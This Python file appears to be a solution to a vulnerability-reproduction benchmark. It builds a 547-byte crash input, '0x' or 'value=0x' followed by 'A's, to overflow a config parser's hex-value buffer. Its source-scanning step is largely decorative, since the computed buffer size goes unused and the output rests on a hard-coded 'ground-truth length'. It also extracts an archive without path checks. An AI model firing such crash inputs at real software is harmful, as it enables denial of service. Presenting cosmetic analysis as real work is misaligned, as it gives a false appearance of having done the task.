import os
import tarfile
import tempfile

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Extract the tarball to examine the source code
        with tempfile.TemporaryDirectory() as tmpdir:
            with tarfile.open(src_path, 'r:gz') as tar:
                tar.extractall(tmpdir)
            
            # Look for configuration file handling code
            config_patterns = self._find_config_patterns(tmpdir)
            
            if config_patterns:
                # Use patterns to construct PoC
                return self._construct_poc(config_patterns)
            else:
                # Fallback: generic buffer overflow with hex value
                return self._generic_poc()
    
    def _find_config_patterns(self, dir_path: str):
        """Search source code for configuration parsing patterns."""
        patterns = {}
        
        for root, _, files in os.walk(dir_path):
            for file in files:
                if file.endswith(('.c', '.cpp', '.cc', '.cxx')):
                    filepath = os.path.join(root, file)
                    try:
                        with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
                            content = f.read()
                            
                            # Look for hex value parsing
                            if '0x' in content or 'strtol' in content or 'strtoul' in content:
                                # Look for buffer size definitions
                                lines = content.split('\n')
                                for i, line in enumerate(lines):
                                    if 'char' in line and '[' in line and ']' in line:
                                        # Found buffer declaration
                                        if '[' in line and ']' in line:
                                            start = line.find('[') + 1
                                            end = line.find(']')
                                            if start < end:
                                                size_str = line[start:end].strip()
                                                if size_str.isdigit():
                                                    patterns.setdefault('buffer_sizes', []).append(int(size_str))
                                    
                                    # Look for hex parsing patterns
                                    if '0x' in line or 'x=' in line or 'hex' in line.lower():
                                        patterns.setdefault('hex_patterns', []).append(line.strip())
                    except:
                        continue
        
        return patterns if patterns else None
    
    def _construct_poc(self, patterns: dict) -> bytes:
        """Construct PoC based on discovered patterns."""
        # Target buffer size (use smallest found or default)
        buffer_size = min(patterns.get('buffer_sizes', [256])) if patterns.get('buffer_sizes') else 256
        
        # We need to overflow the buffer. The ground-truth length is 547 bytes.
        # Create a hex value that's longer than buffer_size
        overflow_len = 547
        
        # Create a long hex string (0x followed by many hex digits)
        # Each hex digit is 0.5 byte, but we need bytes in the output
        hex_digits = 'A' * (overflow_len - 2)  # Reserve 2 bytes for "0x"
        poc = f"0x{hex_digits}"
        
        # Ensure exact length
        if len(poc) > overflow_len:
            poc = poc[:overflow_len]
        elif len(poc) < overflow_len:
            poc = poc + 'A' * (overflow_len - len(poc))
        
        return poc.encode()
    
    def _generic_poc(self) -> bytes:
        """Generate generic buffer overflow PoC for hex value overflow."""
        # Ground-truth length is 547 bytes
        # Create a configuration line with a very long hex value
        # Format: "key=0x<very_long_hex_value>"
        
        # Key part (typical config key)
        key = "value=0x"
        
        # Calculate hex part length
        hex_length = 547 - len(key)
        
        # Fill with hex digits (A-F are valid hex digits)
        hex_value = 'A' * hex_length
        
        poc = f"{key}{hex_value}"
        
        # Verify length
        assert len(poc) == 547, f"PoC length {len(poc)} != 547"
        
        return poc.encode()